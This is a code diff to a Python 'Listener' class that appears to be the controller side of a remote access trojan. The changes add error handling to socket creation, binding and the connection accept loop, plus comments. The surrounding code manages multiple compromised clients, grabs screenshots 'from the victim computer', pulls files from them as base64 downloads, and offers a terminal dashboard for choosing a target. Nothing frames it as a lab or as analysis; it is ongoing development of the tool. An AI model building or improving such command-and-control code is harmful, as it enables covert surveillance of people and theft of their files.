@@ -10,6 +10,7 @@ import base64
 import socket
 import threading
 import json
+import time
 from queue import Queue
 
 
@@ -60,13 +61,19 @@ class Listener:
     # ****************** THREAD POOL ******************************************************************
 
     def create_socket(self, ip, port):
+
+        listener = None
+
         try:
             listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        except Exception as msg:
+            print("Socket Creation Error "+str(msg))
+        try:
             listener.bind((ip, port))
             listener.listen(5)
-            return listener
         except Exception as msg:
-            print(msg)
+            print("Binding Error: "+str(msg))
+        return listener
 
     def listen(self):
 
@@ -76,16 +83,21 @@ class Listener:
         while True:
 
             try:
-                # Wait for first connection. This is a blocking code
-                response = listener.accept()
-                # This prevents connection from timeout
-                listener.setblocking(True)
-                self.connection_list.append(response[0])
-                self.address_list.append(response[1])
-                print("[+] Got a connection" + str(response[1]))
+                if listener is not None:
+                    # Wait for first connection. This is a blocking code
+                    response = listener.accept()
+                    # This prevents connection from timeout
+                    listener.setblocking(True)
+                    self.connection_list.append(response[0])
+                    self.address_list.append(response[1])
+                    print("[+] Got a connection" + str(response[1]))
+                else:
+                    break
             except Exception as msg:
-                print(msg)
+                print("Listener Error "+str(msg))
+                time.sleep(1)
 
+    # List all available connections
     def list_connections(self):
 
         results = ""
@@ -111,6 +123,7 @@ class Listener:
 
             print("----Clients----" + "\n" + results)
 
+    # Get screenshot from the victim computer
     def get_screenshot(self, command):
         self.send_data(command)
         screenshot = self.receive_data()
@@ -150,6 +163,7 @@ class Listener:
             file.write(base64.b64decode(content))
             return "[+] Download successful"
 
+    # This is the part where all connections will be listed, and serve as a dashboard or main menu
     def terminal(self):
 
         ascii_art = """               
